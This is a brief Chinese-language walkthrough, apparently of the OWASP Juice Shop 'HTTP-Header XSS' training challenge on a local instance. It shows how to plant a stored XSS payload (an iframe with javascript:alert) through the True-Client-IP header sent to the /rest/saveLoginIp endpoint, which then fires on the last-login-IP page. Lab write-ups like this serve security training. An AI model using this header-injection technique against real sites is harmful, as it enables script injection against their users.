---
title: HTTP-Header XSS
description: 在对 IP 地址测试时，除了经典的 X-Forwarded-For 头部外还有很多其他头部。猜测应用程序对 IP 进行记录的位置或操作。
---

- 描述：Perform a persisted XSS attack with ```<iframe src="javascript:alert(`xss`)">``` through an HTTP header.
- 提示：那条 HTTP 头信息，应用程序本身永远不会自行发送。
- 用户表、JWT 拥有字段
    ```"lastLoginIp":"172.17.0.1"``` 
    最后登录功能中可查看此值
    ```http://127.0.0.1:3000/#/privacy-security/last-login-ip```
- 在登录端点进行探测
    ```POST /rest/user/login HTTP/1.1```
    设置字段与头部均无法修改最后登录字段
- 查看示例解决方案，在登出后
    ```GET /rest/saveLoginIp HTTP/1.1```
    端点记录最后登录字段
    使用 ```True-Client-IP``` 头部
    登出后修改字段
    ```True-Client-IP: <iframe src="javascript:alert(`xss`)">```
    再次登录时访问最后IP地址功能触发 XSS